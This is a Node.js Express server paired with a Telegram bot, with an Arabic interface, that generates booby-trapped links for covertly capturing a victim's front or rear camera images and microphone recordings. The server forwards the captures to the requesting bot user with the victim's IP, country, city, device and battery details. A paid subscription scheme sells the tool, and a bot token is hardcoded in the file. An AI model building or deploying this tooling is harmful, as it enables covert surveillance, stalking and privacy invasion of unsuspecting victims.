const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const botToken = '7244359397:AAHJieFIF4SnCD3EEHc5tWYeZXgfC7b_tEw';
const bot = new TelegramBot(botToken, { polling: true });

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });
const voiceUpload = multer({ dest: 'uploads/' });

const MAX_FREE_ATTEMPTS = 3;
const userVisits = {};
const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية المجانية. الرجاء شراء اشتراك من المطور لاستخدام البوت بدون قيود.';

const adminId = '7130416076';
const subscribedUsers = new Set();

app.get('/:userId', (req, res) => {
    const userId = req.params.userId;
    const cameraType = req.query.cameraType;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'location.html'));
        return;
    }

    if (!userVisits[userId]) {
        userVisits[userId] = { frontCamera: 0, rearCamera: 0 };
    }

    userVisits[userId][cameraType === 'front' ? 'frontCamera' : 'rearCamera']++;

    if (userVisits[userId][cameraType === 'front' ? 'frontCamera' : 'rearCamera'] > MAX_FREE_ATTEMPTS) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'location.html'));
});

app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const chatId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    if (files && files.length > 0) {
        console.log(`Received ${files.length} images from user ${chatId}`);

        const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            const sendPhotoPromises = files.map(file => bot.sendPhoto(chatId, file.buffer, { caption }));
            await Promise.all(sendPhotoPromises);
            console.log('Photos sent successfully');
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to send photos:', err);
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        console.log('No images received');
        res.status(400).json({ error: 'No images received' });
    }
});

app.post('/submitVoice', voiceUpload.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voicePath = req.file.path;
    const additionalData = JSON.parse(req.body.additionalData);

    const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
    `;

    bot.sendVoice(chatId, voicePath, { caption }).then(() => {
        fs.unlinkSync(voicePath);
        res.send('Voice submitted successfully!');
    }).catch(error => {
        console.error(error);
        res.status(500).send('Error sending voice message.');
    });
});

app.get('/record', (req, res) => {
    res.sendFile(path.join(__dirname, 'record.html'));
});

bot.onText(/\/subscribe (\d+)/, (msg, match) => {
    if (msg.from.id.toString() !== adminId) {
        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
        return;
    }

    const userId = match[1];
    if (subscribedUsers.add(userId).size > subscribedUsers.size) {
        bot.sendMessage(msg.chat.id, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
    } else {
        bot.sendMessage(msg.chat.id, `المستخدم ${userId} موجود بالفعل في قائمة المشتركين.`);
    }
});

bot.onText(/\/unsubscribe (\d+)/, (msg, match) => {
    const userId = match[1];
    if (subscribedUsers.delete(userId)) {
        bot.sendMessage(msg.chat.id, `تمت إزالة المستخدم ${userId} من قائمة المشتركين.`);
    } else {
        bot.sendMessage(msg.chat.id, `المستخدم ${userId} غير موجود في قائمة المشتركين.`);
    }
});

bot.onText(/\/listsubscribers/, (msg) => {
    if (msg.from.id.toString() !== adminId) {
        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
        return;
    }

    const subscribersList = Array.from(subscribedUsers).join('\n');
    bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! اختر إحدى الخيارات التالية:';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'تصوير كام أمامي', callback_data:'front_camera' }],
                [{ text: 'تصوير كام خلفي', callback_data:'rear_camera' }],
                [{ text: 'تسجيل صوت', callback_data:'voice_record' }],
            ]
        }
    });
});

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'front_camera' || data === 'rear_camera') {
        const url = `https://creative-marmalade-periwinkle.glitch.me/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
    } else if (data === 'voice_record') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const duration = parseInt(msg.text, 10);

    if (!isNaN(duration)) {
        if (duration > 0 && duration <= 20) {
            const link = `https://creative-marmalade-periwinkle.glitch.me/record?chatId=${chatId}&duration=${duration}`;
            bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
        } else {
            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
        }
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});